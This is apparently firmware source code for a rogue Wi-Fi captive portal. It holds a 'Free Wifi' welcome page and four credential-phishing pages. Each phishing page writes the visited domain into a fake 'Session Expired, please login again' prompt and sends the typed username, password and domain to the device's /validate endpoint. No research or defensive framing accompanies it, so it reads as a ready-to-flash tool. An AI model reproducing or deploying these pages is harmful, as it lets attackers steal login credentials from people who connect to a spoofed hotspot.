const char PORTAL_LOGIN_HTML[] PROGMEM = R"=====(
<!DOCTYPE html>
<html>
<body bgcolor="black" text="white">
<center><h1>
Welcome to our Free Wifi!
</h1>
<img width='86' height='86' src='data:image/png;base64,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'>
<br>
<small>Your security is important to us...</small>
</center>
<body>
</html>
)=====";


const char SITE_OTHER_HTML[] PROGMEM = R"=====(
<!DOCTYPE html>
<html>
<body bgcolor="black" text="white">
<center><h1>
Session at 
<script>
document.write(document.domain);
</script>
 Expired<br><br>Please login again.</h1></center><center>
</p><form method="get" action="/validate"><label>USERNAME: </label><input type="text" name="user" length=64><br><label>PASSWORD: </label><input type="password" name="pass" length=64><input type="hidden" id="isURL" name="url" value="" /><br><br><input value="Log-In" type="submit"></form>
<script>
document.getElementById("isURL").value=document.domain;
</script>
</center>
<body>
</html>
)=====";


const char SITE1_HTML[] PROGMEM = R"=====(
<!DOCTYPE html>
<html>
<body bgcolor="orange" text="white">
<center><h1>
Session at 
<script>
document.write(document.domain);
</script>
 Expired<br><br>Please login again.</h1></center><center>
</p><form method="get" action="/validate"><label>USERNAME: </label><input type="text" name="user" length=64><br><label>PASSWORD: </label><input type="password" name="pass" length=64><input type="hidden" id="isURL" name="url" value="" /><br><br><input style="color:white;background-color:blue" value="Log-In" type="submit"></form>
<script>
document.getElementById("isURL").value=document.domain;
</script>
</center>
<body>
</html>
)=====";


const char SITE2_HTML[] PROGMEM = R"=====(
<!DOCTYPE html>
<html>
<body bgcolor="blue" text="white">
<center><h1>
Session at 
<script>
document.write(document.domain);
</script>
 Expired<br><br>Please login again.</h1></center><center>
</p><form method="get" action="/validate"><label>USERNAME: </label><input type="text" name="user" length=64><br><label>PASSWORD: </label><input type="password" name="pass" length=64><input type="hidden" id="isURL" name="url" value="" /><br><br><input style="color:black;background-color:white" value="Log-In" type="submit"></form>
<script>
document.getElementById("isURL").value=document.domain;
</script>
</center>
<body>
</html>
)=====";


const char SITE3_HTML[] PROGMEM = R"=====(
<!DOCTYPE html>
<html>
<body bgcolor="purple" text="white">
<center><h1>
Session at 
<script>
document.write(document.domain);
</script>
 Expired<br><br>Please login again.</h1></center><center>
</p><form method="get" action="/validate"><label>USERNAME: </label><input type="text" name="user" length=64><br><label>PASSWORD: </label><input type="password" name="pass" length=64><input type="hidden" id="isURL" name="url" value="" /><br><br><input style="color:white;background-color:blue" value="Log-In" type="submit"></form>
<script>
document.getElementById("isURL").value=document.domain;
</script>
</center>
<body>
</html>
)=====";
